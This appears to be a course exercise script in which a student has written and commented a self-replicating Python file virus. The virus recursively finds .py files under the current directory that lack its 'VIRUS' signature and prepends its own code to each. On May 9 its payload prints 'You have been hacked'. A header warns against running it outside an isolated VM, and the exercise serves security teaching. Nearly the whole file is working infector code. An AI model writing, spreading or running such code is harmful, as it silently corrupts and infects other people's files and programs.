#!/bin/python3

# Script: Ops 301d5 Ops Challenge: Class 14
# Author: Dean Weiss
# Date of latest revision: 16 Sept 2022
# Purpose:Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.

# Importing the OS Library
import os

# Importing the Datetime Library
import datetime

# Assigning the variable VIRUS to SIGNATURE
SIGNATURE = "VIRUS"

# Define the function with the paramete of path
def locate(path):
    # An empty array
    files_targeted = []
    # Method to get the list of all files and directories in the path directory
    filelist = os.listdir(path)
    # Iterate for fname in the filelist above
    for fname in filelist:
        # A method to check whether the specified path is in the existing directory.
        if os.path.isdir(path+"/"+fname):
            # call the files_targeted array and adds multiple individiaul elements to the end of the list
            files_targeted.extend(locate(path+"/"+fname))
        # Looks to see if fname is a python script     
        elif fname[-3:] == ".py":
            # Makes infected variable equal false
            infected = False
            # Looks at each line in a file for the fname
            for line in open(path+"/"+fname):
                # checking each line for signature
                if SIGNATURE in line:
                    # sets infected to equal true
                    infected = True
                    # ends scripts if infected equals true
                    break
            # if infected equals false the code continues    
            if infected == False:
                # Appends the targeted file
                files_targeted.append(path+"/"+fname)
    # returns the targeted files            
    return files_targeted
# Defines a function that will look for infect in the targeted files
def infect(files_targeted):
    # Will always execute file from home directory
    virus = open(os.path.abspath(__file__))
    # Assigns virusstring an empty variable
    virusstring = ""
    # checks over each line in the virus file
    for i,line in enumerate(virus):
        # if greater than or equal to 0 and less then 39
        if 0 <= i < 39:
            # adds virusstring to the line
            virusstring += line
    # closes virus         
    virus.close
    # targets fname in targeted files
    for fname in files_targeted:
        # Opens file with fname
        f = open(fname)
        # puts opened files contents in a temporary file
        temp = f.read()
        # closes the file
        f.close()
        # opens the file name to write in
        f = open(fname,"w")
        # writes the virustring to the temp file
        f.write(virusstring + temp)
        # closes the file
        f.close()

# defines the function detonate
def detonate():
    # Run If it is the fifth month and the 9th day
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # display the message
        print "You have been hacked"
# target the current directory
files_targeted = locate(os.path.abspath(""))
# infect files in the files_targeted
infect(files_targeted)
# calls the detonate function
detonate()
